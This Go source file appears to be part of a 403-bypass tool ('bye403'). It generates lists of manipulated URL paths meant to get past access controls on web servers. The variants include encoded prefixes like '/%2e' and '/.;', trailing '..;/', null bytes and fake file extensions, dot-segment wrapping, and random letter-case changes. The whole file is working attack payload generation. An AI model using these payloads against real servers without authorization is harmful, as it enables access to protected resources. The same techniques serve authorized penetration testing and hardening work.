package main

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func (b *bye403) front(u string) []string {
	f := []string{
		"/%2e", "/%2f", "/;", "/.;", "//;/", "/.",
		";foo=bar",
	}
	var urls []string
	for _, s := range f {
		urls = append(urls, fmt.Sprintf("%v%s", s, u))
	}
	return urls
}

func (b *bye403) back(u string) []string {
	trail := []string{
		"/", "..;/", "/..;/", "%20", "%09", "%00",
		".json", ".css", ".html", "?", "??", "???",
		"?testparam", "#", "#test", "/.", "//", ";/",
		"/~",
	}
	var urls []string
	for _, t := range trail {
		urls = append(urls, fmt.Sprintf("%s%v", u, t))
	}
	return urls
}

func (b *bye403) bookends(u string) []string {
	var urls []string

	urls = append(urls, fmt.Sprintf("/%s//", u))
	urls = append(urls, fmt.Sprintf("/.%s/./", u))
	urls = append(urls, fmt.Sprintf("/.%s/..", u))
	return urls
}

func (b *bye403) spongeb(u string) string {
	var sb string
	u = strings.ToLower(u)
	sp := strings.Split(u, "")
	for _, c := range sp {
		if rand.Intn(2) == 1 {
			c = strings.ToUpper(c)
			sb += c
		} else {
			sb += c
		}
	}
	return sb
}

func (b *bye403) paths(target string) []string {
	var paths []string
	paths = append(paths, b.bookends(b.path)...)
	paths = append(paths, b.front(b.path)...)
	paths = append(paths, b.back(b.path)...)
	paths = append(paths, b.spongeb(b.path))

	return paths
}
